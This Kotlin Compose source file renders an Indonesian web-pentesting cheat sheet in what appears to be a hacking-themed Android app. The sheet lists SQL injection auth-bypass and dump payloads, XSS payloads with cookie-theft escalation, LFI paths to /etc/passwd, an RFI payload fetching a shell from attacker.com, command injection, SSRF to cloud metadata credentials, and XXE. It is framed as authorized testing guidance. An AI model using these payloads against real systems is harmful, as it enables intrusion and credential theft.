package self.apk.sickhack.genz.ui.screens

import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import self.apk.sickhack.genz.ui.components.SectionTitle
import self.apk.sickhack.genz.ui.components.TerminalScaffold
import self.apk.sickhack.genz.ui.theme.TerminalGreenDim
import self.apk.sickhack.genz.ui.theme.TerminalYellow

@Composable
fun GuideScreen(onBack: () -> Unit) {
    TerminalScaffold(title = "Guide", onBack = onBack) {
        SectionTitle("recon")
        Text("1. Kumpulkan informasi: subdomain (crt.sh), DNS, IP & ISP (ip-api).\n2. Temukan parameter dinamis (inurl:php?id=, page=, file=, cat=).\n3. Cek admin panel & path umum dengan Admin Finder.\n4. Catat stack: server header, CMS, framework, versi.\n5. Baru tentukan vektor serangan yang relevan.", color = TerminalYellow, fontSize = 12.sp)

        SectionTitle("sqli")
        Text("1. Konfirmasi: sisipkan ' dan lihat error SQL (mysql_fetch, ORA-, unclosed quotation).\n2. Kolom: ORDER BY 1..N sampai error.\n3. Union: UNION SELECT NULL,... samakan jumlah kolom.\n4. Data: version(), database(), user(), information_schema.tables/columns.\n5. Blind: SLEEP(5) / WAITFOR DELAY / pg_sleep + ukur waktu.\n6. Auth bypass: ' OR '1'='1'-- - di kolom login.\n7. DIOS: group_concat(table_name) untuk dump cepat.\n8. Tulis laporan: URL, parameter, payload, bukti, dampak.", color = TerminalGreenDim, fontSize = 12.sp)

        SectionTitle("xss")
        Text("1. Tes refleksi: masukkan token unik, cek muncul di body.\n2. Payload dasar: <script>alert(1)</script>, <img src=x onerror=alert(1)>.\n3. Konteks HTML: buka tag dengan \"><svg/onload=alert(1)>.\n4. Konteks JS: ';alert(1);// , </script><script>alert(1)</script>.\n5. Bypass filter: encodings (charcode, \\x hex, entity), case-mixing, mutation XSS.\n6. Eskalasi: maling cookie (HttpOnly?), CSRF, keylogger.\n7. Jangan simpan XSS persist di sistem produksi tanpa izin.", color = TerminalGreenDim, fontSize = 12.sp)

        SectionTitle("lfi / rfi / rce")
        Text("LFI:\n- ../../../../etc/passwd, ..%2f, ....//, php://filter/convert.base64-encode.\n- Bukti: root:x:0:0, www-data:x:, uid=.\nRFI:\n- http://attacker.com/shell.txt, data://, php://input.\nRCE (command injection):\n- ;id , |id , &&id , `id`, $(id) di parameter yang masuk ke shell.\n- Bukti: uid=0(root), output perintah ter-reflect.\n- Payload blind: ;sleep 5 lalu ukur delay.", color = TerminalGreenDim, fontSize = 12.sp)

        SectionTitle("ssrf / ssti / xxe")
        Text("SSRF:\n- Payload: http://169.254.169.254/latest/meta-data/, metadata.google.internal.\n- Indikator: instance-id, ami-id, security-credentials.\n- Via: url=, img=, wget=, curl=, webhook callback.\nSSTI:\n- Tes: {{7*7}} -> 49, \\${7*7}, #{7*7}, <% 7*7 %>.\n- Engine: Jinja2, Twig, Freemarker, Velocity, Thymeleaf.\nXXE:\n- POST body XML dengan <!ENTITY xxe SYSTEM \"file:///etc/passwd\">.\n- Indikator: konten file, error parser, SSRF via entity.", color = TerminalGreenDim, fontSize = 12.sp)

        SectionTitle("reporting")
        Text("Format laporan:\n- Ringkasan eksekutif (1 paragraf).\n- Daftar temuan: [SEVERITY] kategori — bukti.\n- Untuk tiap temuan: URL, parameter, payload, evidence (response), dampak, remediasi.\n- Remediasi umum: prepared statement, output encoding, whitelist, patch, WAF tuning.\n- Jangan sertakan data sensitif asli; gunakan sampel terpotong.", color = TerminalGreenDim, fontSize = 12.sp)

        SectionTitle("disclaimer")
        Text("Gunakan hanya pada sistem milik sendiri atau dengan izin tertulis. Testing tanpa izin = ilegal.", color = TerminalYellow, fontSize = 12.sp)
    }
}
